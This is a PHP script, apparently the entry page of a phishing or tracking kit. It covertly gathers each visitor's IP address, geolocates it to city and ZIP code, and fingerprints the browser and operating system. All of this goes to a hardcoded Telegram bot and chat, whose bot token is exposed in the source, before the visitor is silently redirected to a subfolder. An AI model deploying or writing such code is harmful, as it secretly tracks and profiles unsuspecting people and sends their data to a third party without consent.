<?php
// Telegram Bot Configuration
$botToken = '8275178226:AAHBkvhZLOx5-rt3TRmNSQeGkifBvxHGIqw';
$chatId = '-5285152803';

// Function to get client IP address
function getClientIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

// Function to get location data from IP
function getLocationData($ip) {
    if ($ip === '127.0.0.1' || $ip === '::1') {
        return [
            'city' => 'Localhost',
            'region' => 'Local Network',
            'country' => 'Internal',
            'zip' => '00000'
        ];
    }
    
    $url = "http://ip-api.com/json/{$ip}";
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 3);
    $response = curl_exec($ch);
    curl_close($ch);
    
    $data = json_decode($response, true);
    
    if ($data && $data['status'] === 'success') {
        return [
            'city' => $data['city'],
            'region' => $data['regionName'],
            'country' => $data['country'],
            'zip' => $data['zip']
        ];
    }
    
    return [
        'city' => 'Unknown',
        'region' => 'Unknown',
        'country' => 'Unknown',
        'zip' => 'Unknown'
    ];
}

// Function to get browser information
function getBrowser() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $browser = "Unknown Browser";
    
    if (preg_match('/MSIE/i', $userAgent) && !preg_match('/Opera/i', $userAgent)) {
        $browser = 'Internet Explorer';
    } elseif (preg_match('/Firefox/i', $userAgent)) {
        $browser = 'Mozilla Firefox';
    } elseif (preg_match('/Chrome/i', $userAgent)) {
        $browser = 'Google Chrome';
    } elseif (preg_match('/Safari/i', $userAgent)) {
        $browser = 'Apple Safari';
    } elseif (preg_match('/Opera/i', $userAgent)) {
        $browser = 'Opera';
    } elseif (preg_match('/Netscape/i', $userAgent)) {
        $browser = 'Netscape';
    }
    
    return $browser;
}

// Function to get operating system
function getOS() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $os = "Unknown OS";
    
    if (preg_match('/linux/i', $userAgent)) {
        $os = 'Linux';
    } elseif (preg_match('/macintosh|mac os x/i', $userAgent)) {
        $os = 'Mac OS';
    } elseif (preg_match('/windows|win32/i', $userAgent)) {
        $os = 'Windows';
    } elseif (preg_match('/android/i', $userAgent)) {
        $os = 'Android';
    } elseif (preg_match('/iphone/i', $userAgent)) {
        $os = 'iPhone';
    } elseif (preg_match('/ipad/i', $userAgent)) {
        $os = 'iPad';
    }
    
    return $os;
}

// Function to send message to Telegram
function sendToTelegram($message, $botToken, $chatId) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data)
        ]
    ];
    
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    
    return $result !== FALSE;
}

// Get visitor information
$ip = getClientIP();
$location = getLocationData($ip);
$browser = getBrowser();
$os = getOS();
$currentTime = date('Y-m-d H:i:s');
$referrer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Direct visit';
$userAgent = $_SERVER['HTTP_USER_AGENT'];

// Format the message for Telegram
$message = "<b>🆕 New Visitor Information 🆕</b>\n\n";
$message .= "<b>🌐 IP Address:</b> <code>{$ip}</code>\n";
$message .= "<b>🏙️ City:</b> {$location['city']}\n";
$message .= "<b>🗺️ Region/State:</b> {$location['region']}\n";
$message .= "<b>🇺🇸 Country:</b> {$location['country']}\n";
$message .= "<b>📮 ZIP Code:</b> {$location['zip']}\n";
$message .= "<b>🔍 Browser:</b> {$browser}\n";
$message .= "<b>💻 OS:</b> {$os}\n";
$message .= "<b>🕒 Time:</b> {$currentTime}\n";
$message .= "<b>🔗 Referrer:</b> {$referrer}\n";
$message .= "<b>👤 User Agent:</b> {$userAgent}\n";

// Send data to Telegram
sendToTelegram($message, $botToken, $chatId);

// Redirect to a folder in the same path (relative path)
$redirectUrl = "./dkka"; // Change "folder-name" to your actual folder name
header("Location: $redirectUrl");
exit();
?>